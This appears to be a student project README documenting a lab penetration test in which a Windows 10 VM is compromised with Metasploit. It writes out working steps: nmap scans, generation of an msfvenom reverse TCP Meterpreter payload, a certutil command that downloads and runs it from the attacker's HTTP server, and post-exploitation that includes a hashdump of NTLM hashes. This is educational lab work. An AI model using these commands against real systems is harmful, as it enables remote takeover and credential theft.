# Vulnerability Analysis and Penetration Testing Using Metasploit

## Project Overview
A hands-on penetration testing project demonstrating a complete attack 
lifecycle against an unpatched Windows 10 target in an isolated virtual 
lab environment built on a single PC using VMware Workstation.

**Institution:** Capital University of Science & Technology (CUST), Islamabad  
**Department:** Cyber Security  
**Supervisor:** Miss Rafiya Tariq  
**Team Members:**
- Muhammad Abid Rasul — BCY251019
- Sameer Ahmed — BCY251020
- Abdullah Bin Faisal — BCY251031

---

## Lab Environment

| Component | Details |
|---|---|
| Attacker | Kali Linux 2024 — VMware |
| Target | Windows 10 Pro Build 10240 x64 |
| Network | VMware NAT 192.168.80.0/24 |
| Attacker IP | 192.168.80.133 |
| Target IP | 192.168.80.128 |
| Tools | Nmap, Metasploit, Msfvenom, Python |

---

## Attack Method — Reverse TCP Payload Delivery

**Technique:** Msfvenom reverse TCP Meterpreter payload delivered via Python HTTP server

### Step 1 — Reconnaissance
```bash
nmap -Pn -sS 192.168.80.128
```
Discovers open ports on the Windows 10 target.
Also ran vulnerability check:
```bash
nmap -Pn -p 445 --script smb-vuln-ms17-010 192.168.80.128
```

### Step 2 — Generate Payload
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.80.133 LPORT=4444 -f exe -o payload.exe
```

### Step 3 — Host Payload
```bash
python3 -m http.server 8080
```

### Step 4 — Start Listener
```bash
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.80.133
set LPORT 4444
run
```

### Step 5 — Execute on Windows 10 Target
```cmd
certutil -urlcache -split -f http://192.168.80.133:8080/payload.exe payload.exe
payload.exe
```

### Step 6 — Meterpreter Session Opened

---

## Post-Exploitation Evidence

| Command | Output | What It Proves |
|---|---|---|
| getuid | DESKTOP-ACLE2LC\PC | Active session inside target |
| sysinfo | Windows 10 Build 10240 x64 | Target OS confirmed |
| ipconfig | 192.168.80.128 | Correct target verified |
| ps | Full process list | Complete process visibility |
| ls | Directory listing | Full filesystem access |
| hashdump | NTLM hashes extracted | Credential access confirmed |

---

## Tools Used

| Tool | Version | Purpose |
|---|---|---|
| Kali Linux | 2024 | Attacker operating system |
| Nmap | 7.99 | Network reconnaissance and port scanning |
| Metasploit Framework | 6.4.135 | Exploitation and post-exploitation |
| Msfvenom | 6.4.135 | Reverse TCP payload generation |
| Python HTTP Server | 3.x | Payload hosting and delivery |
| VMware Workstation | Latest | Lab virtualization and network isolation |

---

## Target Configuration

Windows 10 was configured as a vulnerable target:
- Windows Defender disabled
- Windows Firewall disabled
- SMBv1 enabled
- Windows Update disabled
- Build 10240 — unpatched original 2015 release

---

## Ethical Disclaimer

> All attacks were performed only on a virtual machine owned and 
> controlled by the researchers in a completely isolated VMware NAT 
> network with no connection to the real internet. This project is 
> strictly for educational purposes only. Never perform penetration 
> testing on any system you do not own or have explicit written 
> permission to test. Unauthorized penetration testing is illegal.

---

## Screenshots

See the `/screenshots` folder for evidence of all attack phases:

| File | What It Shows |
|---|---|
| 01_nmap_port_scan.png | Nmap -Pn -sS scan showing open ports |
| 02_nmap_vulnerable.png | Nmap confirming VULNERABLE to CVE-2017-0143 |
| 03_meterpreter_session.png | Meterpreter session 1 opened on Windows 10 |
| 04_getuid.png | getuid showing DESKTOP-ACLE2LC\PC |
| 05_sysinfo.png | sysinfo showing Windows 10 Build 10240 x64 |
| 06_hashdump.png | NTLM password hashes extracted |
| 07_ps.png | Full running process list on target |
---

## Project Report

Full project report available in the `/report` folder.

### Step 6 — Meterpreter Session Opened
